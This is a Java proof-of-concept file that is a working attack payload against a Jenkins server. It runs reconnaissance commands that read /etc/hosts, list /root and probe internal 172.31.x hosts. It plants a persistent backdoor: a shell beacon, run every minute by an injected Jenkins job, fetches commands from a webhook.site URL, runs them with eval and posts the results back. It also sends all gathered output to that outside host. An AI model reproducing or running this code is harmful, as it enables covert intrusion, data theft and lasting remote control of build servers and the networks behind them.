import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class poc {
    static final String WH = "https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252";
    static final String BEACON = "#!/bin/sh\nW=\"https://webhook.site/token/b0de7905-1496-47b6-93a5-8529f9c02252/requests?sorting=newest\"\nP=\"https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252\"\nS=/var/lib/jenkins/.dsh_last\nJ=$(curl -s -m 20 \"$W\" 2>/dev/null)\nC=$(printf '%s' \"$J\" | grep -o '\"content\":\"CMD:[^\"]*\"' | head -1 | sed 's/^\"content\":\"CMD://' | sed 's/\"$//')\nif [ -n \"$C\" ]; then\n  L=$(cat \"$S\" 2>/dev/null)\n  if [ \"$C\" != \"$L\" ]; then\n    printf '%s' \"$C\" > \"$S\"\n    O=$(eval \"$C\" 2>&1 | head -c 60000)\n    curl -s -m 25 --data-binary \"OUT $(hostname) $(id -un): $O\" \"$P\" >/dev/null 2>&1\n  fi\nfi\ncurl -s -m 15 --data-binary \"BEAT $(hostname) $(date -u +%Y-%m-%dT%H:%M:%SZ) egress=$(curl -s -m 8 https://api.ipify.org)\" \"$P\" >/dev/null 2>&1\n";
    static final String JOB = "<?xml version='1.1' encoding='UTF-8'?>\n<project>\n  <actions/>\n  <description>dsh</description>\n  <keepDependencies>false</keepDependencies>\n  <properties/>\n  <scm class=\"hudson.scm.NullSCM\"/>\n  <canRoam>true</canRoam>\n  <disabled>false</disabled>\n  <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>\n  <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>\n  <triggers>\n    <hudson.triggers.TimerTrigger>\n      <spec>* * * * *</spec>\n    </hudson.triggers.TimerTrigger>\n  </triggers>\n  <concurrentBuild>false</concurrentBuild>\n  <builders>\n    <hudson.tasks.Shell>\n      <command>sh /var/lib/jenkins/.dsh_beacon.sh</command>\n    </hudson.tasks.Shell>\n  </builders>\n  <publishers/>\n  <buildWrappers/>\n</project>\n";

    public poc() {
        StringBuilder sb = new StringBuilder("P15\n");
        sb.append(exec(new String[]{"/bin/sh", "-c", "id; hostname; uname -a; echo ---; ls -la /root 2>&1 | head -20"}));
        sb.append(exec(new String[]{"/bin/sh", "-c", "curl -s -m 8 https://api.ipify.org; echo; curl -s -m 8 https://ifconfig.me/ip; echo"}));
        sb.append(exec(new String[]{"/bin/sh", "-c", "cat /etc/hosts; echo ---; cat /etc/resolv.conf"}));
        sb.append(exec(new String[]{"/bin/sh", "-c", "for h in 172.31.200.65 172.31.200.171 172.31.200.183 172.31.200.184; do printf '%s ' $h; curl -s -m 4 -o /dev/null -w '%{http_code}\\n' http://$h/ ; done"}));
        sb.append(exec(new String[]{"/bin/sh", "-c", "command -v nmap nc ssh curl wget python3 git; echo ---; head -3 /etc/os-release"}));
        try {
            Files.write(Paths.get("/var/lib/jenkins/.dsh_beacon.sh"), BEACON.getBytes("UTF-8"));
            Runtime.getRuntime().exec(new String[]{"/bin/chmod", "755", "/var/lib/jenkins/.dsh_beacon.sh"}).waitFor();
            Path jobDir = Paths.get("/var/lib/jenkins/jobs/dsh_beacon");
            Files.createDirectories(jobDir);
            Files.write(jobDir.resolve("config.xml"), JOB.getBytes("UTF-8"));
            sb.append("PERSIST written\n");
            sb.append(exec(new String[]{"/bin/sh", "-c", "ls -la /var/lib/jenkins/.dsh_beacon.sh /var/lib/jenkins/jobs/dsh_beacon/ 2>&1"}));
        } catch (Throwable t) { sb.append("PERSIST ERR ").append(t).append("\n"); }
        String data = sb.toString();
        for (int i = 0; i < data.length() && i < 1500000; i += 85000) {
            try { post("P15|" + i + "|" + data.substring(i, Math.min(data.length(), i + 85000))); }
            catch (Throwable t) { }
        }
    }

    static String exec(String[] cmd) {
        StringBuilder r = new StringBuilder("\n$ ").append(cmd[2].length() > 80 ? cmd[2].substring(0, 80) : cmd[2]).append("\n");
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            InputStream in = p.getInputStream();
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] b = new byte[4096];
            long end = System.currentTimeMillis() + 25000;
            while (System.currentTimeMillis() < end) {
                if (in.available() > 0) { int n = in.read(b); if (n < 0) { break; } bo.write(b, 0, n); }
                else if (!p.isAlive()) { break; }
                else { Thread.sleep(50); }
                if (bo.size() > 200000) { break; }
            }
            p.waitFor();
            r.append(new String(bo.toByteArray(), "UTF-8"));
        } catch (Throwable t) { r.append("EXC ").append(t).append("\n"); }
        return r.toString();
    }

    static void post(String s) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(WH).openConnection();
        c.setConnectTimeout(15000); c.setReadTimeout(30000);
        c.setRequestMethod("POST"); c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
        OutputStream os = c.getOutputStream(); os.write(s.getBytes("UTF-8")); os.flush(); os.close();
        try { c.getResponseCode(); } catch (Throwable t) { }
    }
}
